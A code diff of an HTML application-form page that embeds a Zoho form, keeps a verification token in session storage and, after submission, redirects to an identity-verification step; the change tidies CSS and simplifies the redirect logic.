@@ -200,21 +200,10 @@
     }
 
     @media (max-width: 768px) {
-      .sidebar {
-        display: none;
-      }
-
-      .form-area {
-        padding: 16px;
-      }
-
-      .topnav {
-        padding: 0 16px;
-      }
-
-      .progress-step span {
-        display: none;
-      }
+      .sidebar { display: none; }
+      .form-area { padding: 16px; }
+      .topnav { padding: 0 16px; }
+      .progress-step span { display: none; }
     }
   </style>
 </head>
@@ -228,16 +217,12 @@
         <div class="progress-num">1</div>
         <span>Application</span>
       </div>
-
       <div class="progress-line"></div>
-
       <div class="progress-step">
         <div class="progress-num">2</div>
         <span>Verify Identity</span>
       </div>
-
       <div class="progress-line"></div>
-
       <div class="progress-step">
         <div class="progress-num">3</div>
         <span>Complete</span>
@@ -249,23 +234,19 @@
     <aside class="sidebar">
       <div>
         <div class="sidebar-title">About this form</div>
-
         <div class="info-item">
           <div class="info-icon">📋</div>
           <span>Fill out your application information completely</span>
         </div>
-
         <div class="info-item">
           <div class="info-icon">🔒</div>
           <span>Your data is encrypted and secure</span>
         </div>
-
         <div class="info-item">
           <div class="info-icon">⏳</div>
           <span>Takes about 5–10 minutes to complete</span>
         </div>
       </div>
-
       <div class="secure-badge">
         🟢 SSL Encrypted &amp; Secure
       </div>
@@ -277,10 +258,8 @@
           <h1>Application Form</h1>
           <p>Please fill out all required fields marked with *</p>
         </div>
-
         <div class="form-card">
           <div id="zf_div_pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ"></div>
-
           <div class="redirecting" id="redirecting">
             Application submitted. Redirecting to identity verification...
           </div>
@@ -293,11 +272,8 @@
     const ZOHO_FORM_BASE_URL =
       "https://forms.zohopublic.com/unitedtransports/form/test/formperma/pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ?zf_rszfm=1";
 
-    /**
-     * Always reads token from URL first.
-     * If a NEW token is in the URL, clears all stale session data before storing it.
-     * Returns null (never falls back to session) to force strict URL-based token flow.
-     */
+    let isRedirecting = false;
+
     function getToken() {
       const params = new URLSearchParams(window.location.search);
       const tokenFromUrl = params.get("token");
@@ -306,7 +282,7 @@
         const newToken = tokenFromUrl.trim();
         const existingToken = sessionStorage.getItem("plaid_token");
 
-        // New token detected — wipe all stale session state
+        // Yangi token keldi — eski sessionni tozala
         if (existingToken !== newToken) {
           sessionStorage.clear();
         }
@@ -315,7 +291,6 @@
         return newToken;
       }
 
-      // No token in URL — do NOT fall back to session; show error
       return null;
     }
 
@@ -335,24 +310,18 @@
     }
 
     function redirectToVerify() {
-      const token = sessionStorage.getItem("plaid_token");
-
-      if (!token) {
-        showMissingTokenError();
-        return;
-      }
-
-      const verifyUrl = "/verify?token=" + encodeURIComponent(token);
+      // Bir necha marta chaqirilishini oldini oladi
+      if (isRedirecting) return;
+      isRedirecting = true;
 
       const redirecting = document.getElementById("redirecting");
-      if (redirecting) {
-        redirecting.style.display = "block";
-      }
+      if (redirecting) redirecting.style.display = "block";
 
+      // Token sessionda saqlangan — verify.html u yerdan oladi
       try {
-        window.top.location.href = verifyUrl;
+        window.top.location.href = "/verify";
       } catch (e) {
-        window.location.href = verifyUrl;
+        window.location.href = "/verify";
       }
     }
 
@@ -369,55 +338,42 @@
       );
 
       const iframe = document.createElement("iframe");
-
       iframe.src = buildZohoFormUrl(token);
       iframe.style.border = "none";
       iframe.style.height = "404px";
       iframe.style.width = "100%";
       iframe.style.transition = "all 0.5s ease";
       iframe.setAttribute("aria-label", "Application");
-
       formContainer.appendChild(iframe);
 
-      window.addEventListener(
-        "message",
-        function (event) {
-          const eventData = event.data;
+      window.addEventListener("message", function (event) {
+        const eventData = event.data;
 
-          if (!eventData || eventData.constructor !== String) {
-            return;
+        if (!eventData || eventData.constructor !== String) return;
+
+        const zfData = eventData.split("|");
+        if (zfData.length !== 2 && zfData.length !== 3) return;
+
+        const zfPerma = zfData[0];
+        const zfHeight = parseInt(zfData[1], 10) + 15 + "px";
+        const isSubmitted = zfData.length === 3;
+
+        const formIframe = formContainer.getElementsByTagName("iframe")[0];
+
+        if (
+          formIframe &&
+          formIframe.src.indexOf("formperma") > 0 &&
+          formIframe.src.indexOf(zfPerma) > 0
+        ) {
+          if (formIframe.style.height !== zfHeight) {
+            formIframe.style.height = zfHeight;
           }
 
-          const zfData = eventData.split("|");
-
-          if (zfData.length !== 2 && zfData.length !== 3) {
-            return;
+          if (isSubmitted) {
+            redirectToVerify();
           }
-
-          const zfPerma = zfData[0];
-          const zfHeight = parseInt(zfData[1], 10) + 15 + "px";
-          const isSubmitted = zfData.length === 3;
-
-          const formIframe = formContainer.getElementsByTagName("iframe")[0];
-
-          if (
-            formIframe &&
-            formIframe.src.indexOf("formperma") > 0 &&
-            formIframe.src.indexOf(zfPerma) > 0
-          ) {
-            if (formIframe.style.height !== zfHeight) {
-              formIframe.style.height = zfHeight;
-            }
-
-            if (isSubmitted) {
-              setTimeout(function () {
-                redirectToVerify();
-              }, 700);
-            }
-          }
-        },
-        false
-      );
+        }
+      }, false);
     }
 
     loadZohoForm();
